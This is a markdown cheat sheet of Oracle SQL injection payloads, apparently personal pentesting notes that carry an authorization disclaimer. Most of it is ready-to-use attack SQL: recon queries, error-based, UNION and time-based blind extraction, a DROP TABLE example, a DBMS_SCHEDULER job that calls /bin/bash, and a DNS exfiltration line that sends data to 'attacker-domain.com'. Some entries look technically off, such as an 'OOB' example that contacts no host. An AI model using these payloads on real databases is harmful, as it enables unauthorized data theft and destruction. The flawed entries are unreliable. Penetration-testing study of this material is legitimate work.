# Oracle Database Enumeration & SQL Injection Cheat Sheet (VAPT Research Notes)

> Personal research notes for authorized VAPT / lab practice on a self-hosted Oracle instance.

---

## 1. Schema Reference

| Object | Type | Purpose |
|---|---|---|
| `SYS` / `SYSTEM` | Default admin schemas | Own the data dictionary and core objects |
| `ALL_*` views | Metadata views | Objects accessible to current user |
| `USER_*` views | Metadata views | Objects owned by current user |
| `DBA_*` views | Metadata views (privileged) | All objects in the database (needs DBA role) |

> In Oracle, a "schema" = a database user. Every user owns a schema of the same name.

### Key data dictionary views
```sql
ALL_TABLES / USER_TABLES / DBA_TABLES
ALL_TAB_COLUMNS / USER_TAB_COLUMNS / DBA_TAB_COLUMNS
ALL_OBJECTS / USER_OBJECTS / DBA_OBJECTS
ALL_USERS / DBA_USERS
ALL_VIEWS / USER_VIEWS
ALL_PROCEDURES
ALL_INDEXES
DUAL   -- dummy one-row table, essential for Oracle injection (SELECT ... FROM DUAL)
```

### Naming convention
```sql
schema_name.table_name
```

---

## 2. Basic Recon Syntax

```sql
SELECT banner FROM v$version;              -- DB version
SELECT * FROM v$version;                   -- Full version info
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL;   -- Current DB name
SELECT USER FROM DUAL;                      -- Current logged-in user
SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM DUAL;
SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM DUAL; -- Hostname
SELECT COUNT(*) FROM table_name;            -- Row count
SELECT username FROM ALL_USERS;             -- List all DB users (≈ schemas)
```

> Note: Oracle requires every `SELECT` to have a `FROM` clause — use `FROM DUAL` when selecting constants/functions.

---

## 3. Enumerating Databases / Users (Schemas)

```sql
SELECT username FROM ALL_USERS;
SELECT username FROM DBA_USERS;             -- Requires elevated privileges
SELECT DISTINCT owner FROM ALL_TABLES;      -- Schemas that own tables
```

---

## 4. Enumerating Tables

```sql
SELECT table_name FROM ALL_TABLES;
SELECT table_name FROM USER_TABLES;
SELECT table_name FROM ALL_TABLES WHERE owner = 'HR';
SELECT table_name FROM ALL_TAB_COLUMNS WHERE column_name = 'PASSWORD'; -- Hunt by column name
```

---

## 5. Enumerating Columns

```sql
SELECT column_name FROM ALL_TAB_COLUMNS WHERE table_name = 'EMPLOYEES';
SELECT column_name FROM USER_TAB_COLUMNS WHERE table_name = 'EMPLOYEES';
```

---

## 6. Dumping Records

```sql
SELECT * FROM HR.EMPLOYEES;                 -- schema.table
SELECT * FROM Persons WHERE ID = 1;
SELECT * FROM (SELECT * FROM Persons) WHERE ROWNUM <= 10;   -- "TOP 10" equivalent
SELECT * FROM Persons FETCH FIRST 10 ROWS ONLY;             -- Oracle 12c+
```

---

## 7. Error-Based Injection

Oracle error-based extraction commonly abuses functions that throw on bad input, e.g. `CTXSYS.DRITHSX.SN`, `UTL_INADDR.GET_HOST_NAME`, or XML functions like `EXTRACTVALUE`/`XMLType`.

### Classic type-conversion error
```sql
SELECT CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS INT) FROM DUAL;
```

### UTL_INADDR (DNS/hostname resolution error leaks data)
```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)) FROM DUAL;
```

### CTXSYS.DRITHSX.SN (classic Oracle error-based technique)
```sql
SELECT CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL;
```

### XMLType-based error extraction
```sql
SELECT XMLType('<a>' || (SELECT user FROM DUAL) || '</a>') FROM DUAL;
```

### Enumerate version
```sql
SELECT banner FROM v$version WHERE ROWNUM = 1;
```

### Enumerate table names one by one
```sql
SELECT table_name FROM (
    SELECT table_name, ROWNUM rnum FROM (SELECT table_name FROM ALL_TABLES ORDER BY table_name)
) WHERE rnum = 1;   -- increment rnum to page through results
```

---

## 8. Union-Based Injection

```sql
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, banner FROM v$version;
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, user FROM DUAL;
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, table_name FROM ALL_TABLES;
```

> Column count/data type must match. Oracle is strict about `NUMBER` vs `VARCHAR2` — use `NULL` or `'a'` placeholders to fingerprint types column by column.

---

## 9. Time-Based Blind Injection

Oracle has no native `SLEEP()`/`WAITFOR`, so blind timing relies on heavy queries or `DBMS_LOCK.SLEEP` / `DBMS_SESSION.SLEEP`:

```sql
SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM DUAL;   -- may require EXECUTE grant
SELECT CASE WHEN (1=1) THEN DBMS_SESSION.SLEEP(5) ELSE NULL END FROM DUAL; -- 18c+, no special grant needed
```

### Heavy-query based delay (no privilege needed — common fallback)
```sql
SELECT CASE WHEN (1=1) THEN
  (SELECT COUNT(*) FROM ALL_OBJECTS, ALL_OBJECTS)  -- cartesian product to force a delay
ELSE NULL END FROM DUAL;
```

### Extracting data character-by-character (boolean + heavy query)
```sql
SELECT CASE WHEN (SUBSTR((SELECT user FROM DUAL),1,1) = 'S') THEN
  DBMS_SESSION.SLEEP(5)
ELSE NULL END FROM DUAL;
```

---

## 10. Hex / Alternative Encoding Output

```sql
SELECT UTL_RAW.CAST_TO_RAW('Kaif') FROM DUAL;                 -- to RAW
SELECT RAWTOHEX('Kaif') FROM DUAL;                             -- to hex string
SELECT RAWTOHEX(UTL_RAW.CAST_TO_RAW((SELECT user FROM DUAL))) FROM DUAL;
```

### Error-based extraction with hex-encoded output
```sql
SELECT CAST(RAWTOHEX(UTL_RAW.CAST_TO_RAW((SELECT user FROM DUAL))) AS INT) FROM DUAL;
```

---

## 11. Additional Techniques Worth Testing

### Stacked queries
Oracle generally does **not** support stacked queries via a single JDBC/OCI call in most injection contexts (unlike MSSQL) — PL/SQL blocks are the usual workaround:
```sql
BEGIN
  EXECUTE IMMEDIATE 'DROP TABLE test_table';
END;
```

### Command execution (requires elevated privileges)
```sql
-- Via Java stored procedure or DBMS_SCHEDULER (advanced, needs DBA-level access)
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'cmd_job',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled => FALSE
  );
END;
```

### Out-of-band (OOB) exfiltration via DNS
```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL) || '.attacker-domain.com') FROM DUAL;
SELECT EXTRACTVALUE(xmltype('<r><v>test</v></r>'), '/r/v[1]/text()') FROM DUAL; -- classic OOB via HTTP/XXE-style
```

### Comment syntax
```sql
--   (single-line)
/* */ (multi-line)
```

### Privilege enumeration
```sql
SELECT * FROM SESSION_PRIVS;
SELECT * FROM USER_ROLE_PRIVS;
SELECT * FROM USER_SYS_PRIVS;
```

---

## Disclaimer

These notes are for authorized security testing and educational purposes only — use exclusively against systems you own or have explicit written permission to test.
